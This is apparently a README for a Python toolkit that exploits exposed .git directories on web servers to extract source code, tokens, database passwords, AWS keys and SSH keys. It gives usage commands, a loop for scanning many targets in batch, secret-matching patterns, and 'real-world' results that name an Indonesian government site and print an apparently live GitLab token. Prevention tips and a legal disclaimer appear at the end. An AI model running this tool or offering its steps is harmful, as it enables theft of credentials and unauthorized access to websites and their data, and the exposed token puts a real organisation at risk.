# 🔐 Git Repository Dumper - Exposed .git Directory Exploitation Toolkit

This Python toolkit exploits publicly exposed `.git` directories to extract source code, credentials, API keys, and sensitive configuration files from web applications. Features interactive browsing, automated secret hunting, and complete repository reconstruction.

## **Image Preview**

![Git Dumper Terminal](git.jpeg)

## 🧾 main.py

### 📌 Purpose

Automated detection & exploitation of exposed `.git` directories on web servers. Extracts complete source code with:

* **Config Parsing**: Auto-extract GitLab/GitHub tokens, credentials from `.git/config`
* **File Enumeration**: List all files from `.git/index` 
* **Direct Access**: Read source code directly via HTTP
* **Secret Hunter**: Auto-detect API keys, passwords, JWT tokens, AWS keys, database URLs
* **Repository Download**: Fetch all Git objects for complete reconstruction
* **Interactive Shell**: Browse files, search secrets, test common sensitive paths

### 🛠 How It Works

1. **Detect**: Fetch `.git/config` → parse remote URL, embedded credentials, user info
2. **Enumerate**: Parse `.git/index` → extract all tracked file paths
3. **Extract**: Direct HTTP access to files (e.g., `https://target.com/.env`, `app/etc/env.php`)
4. **Hunt**: Regex scan for secrets (API keys, passwords, tokens, database URLs)
5. **Download**: Fetch Git objects (config, HEAD, index, refs) for reconstruction
6. **Report**: Save all findings to `Results/git_dump_{hostname}.txt`

### 📥 Usage

1. `pip3 install requests urllib3`
2. `python3 main.py`
3. Enter target: `https://targeted-site.com` (when prompted)
4. Select option from interactive menu

**Quick Start**:
```bash
python main.py
# Enter: https://target.com
# Option 6: Try common sensitive files (auto-scan)
```

**Interactive Menu Commands**:

```
[1] Download entire repository     # Fetch all Git objects
[2] List files from .git/index      # Enumerate all tracked files
[3] View specific file              # Read any file (e.g., config.php)
[4] Search for secrets in files     # Auto-scan first 20 files for secrets
[5] Show .git/config details        # Re-display config + credentials
[6] Try common sensitive files      # Test .env, wp-config.php, app/etc/env.php, etc.
[0] Exit
```

**Common Sensitive Files Tested**:
- `.env` - Environment variables (database, API keys)
- `app/etc/env.php` - Magento database credentials
- `config/database.yml` - Rails database config
- `wp-config.php` - WordPress database credentials
- `.aws/credentials` - AWS access keys
- `.ssh/id_rsa` - SSH private keys
- `composer.json` / `package.json` - Dependency info
- `docker-compose.yml` - Docker secrets
- `.gitlab-ci.yml` / `.github/workflows/deploy.yml` - CI/CD secrets
- `secrets.json` / `credentials.json` - Hardcoded secrets

### 📁 Output

**Results Directory Structure**:
```
Results/
├── git_dump_target.com.txt          # All findings (files + secrets)
├── .git_target.com_config           # Downloaded Git config
├── .git_target.com_HEAD             # Downloaded HEAD ref
├── .git_target.com_index            # Downloaded index
└── .git_target.com_refs_heads_main  # Downloaded branch ref
```

**Example Output** (`Results/git_dump_lsf.go.id.txt`):
```
Git Repository Secrets Extraction
Target: https://targeted-site.com
Date: 2026-03-17

======================================================================

FILE: .git/config
----------------------------------------------------------------------
[core]
    repositoryformatversion = 0
[remote "origin"]
    url = https://sample:glpat-xp2xr-xxxxxxxxxxx@gitlab.com/user/repo.git

SECRETS FOUND:
  GitLab Token: glpat-xp2xr-xxxxxxxxxxx

======================================================================

FILE: .env
----------------------------------------------------------------------
DB_HOST=localhost
DB_USER=admin
DB_PASS=SuperSecret123!
API_KEY=sk_live_51Hxxx...
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE

SECRETS FOUND:
  Password: SuperSecret123!
  API Key: sk_live_51Hxxx...
  AWS Key: AKIAIOSFODNN7EXAMPLE

======================================================================
```

### 🔍 Secret Detection Patterns

Automatically detects:
- **API Keys**: `api_key=xxx`, `apikey: xxx`
- **Secret Keys**: `secret_key=xxx`, `SECRET_KEY=xxx`
- **Passwords**: `password=xxx`, `DB_PASS=xxx`
- **Database URLs**: `mysql://user:pass@host/db`, `postgres://...`
- **AWS Keys**: `AKIA[0-9A-Z]{16}`
- **GitLab Tokens**: `glpat-[a-zA-Z0-9_-]{20,}`
- **GitHub Tokens**: `ghp_xxx`, `gho_xxx`, `ghs_xxx`
- **JWT Tokens**: `eyJhbGci...`

### 📦 Dependencies

```
requests
urllib3
```

**Install**:
```bash
pip install requests urllib3
```

### 🚀 Advanced Usage

**For Complete Repository Reconstruction** (requires git-dumper):
```bash
# Install git-dumper
pip install git-dumper

# Use git-dumper for full extraction
git-dumper https://target.com/.git Results/target_complete

# Then browse with git
cd Results/target_complete
git log
git show HEAD
git diff HEAD~1 HEAD
```

**Batch Scanning Multiple Targets**:
```python
# Create targets.txt
https://site1.com
https://site2.com
https://site3.com

# Modify main.py to read from file or use loop
for target in $(cat targets.txt); do
    echo $target | python main.py
done
```

### 🎯 Real-World Examples

**Example 1: Government Site (Indonesia)**
```
Target: https://targeted-site.com
Found: .git/config with live GitLab token
Token: glpat-xp2xr-44qfZf4q3RtzB5
Impact: Full source code access via GitLab API
```

**Example 2: E-commerce Magento Site**
```
Target: https://shop.example.com
Found: app/etc/env.php
Extracted: MySQL credentials, admin encryption key
Impact: Database access + admin account takeover
```

**Example 3: WordPress Site**
```
Target: https://blog.example.com
Found: wp-config.php
Extracted: Database credentials, auth salts
Impact: Database access + session hijacking
```

### 🛡️ Prevention (For Developers)

**Block .git Directory** (nginx):
```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

**Block .git Directory** (Apache):
```apache
<DirectoryMatch "^/.*/\.git/">
    Require all denied
</DirectoryMatch>
```

**Remove .git After Deployment**:
```bash
# In your deployment script
rm -rf .git
```

**Use .gitignore for Secrets**:
```gitignore
.env
config/database.yml
app/etc/env.php
wp-config.php
.aws/
.ssh/
```

## ⚠️ Legal Disclaimer

**For authorized security research & penetration testing only.** 

This tool is designed for:
- ✅ Bug bounty programs (authorized scope)
- ✅ Penetration testing (with written permission)
- ✅ Security audits (authorized by client)
- ✅ Educational purposes (lab environments)

**Unauthorized use is illegal and unethical.** Always obtain explicit written permission before testing any system you do not own.

By using this tool, you acknowledge:
1. You have authorization to test the target system
2. You understand applicable laws (CFAA, GDPR, local regulations)
3. You will use findings responsibly (coordinated disclosure)
4. You accept full legal responsibility for your actions

All security research follows coordinated vulnerability disclosure guidelines.

---
## 👨‍💻 Author

**Bob Marley**

**Support the Project**:

```
₿ BTC: 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh
```

**©khadafigans**  
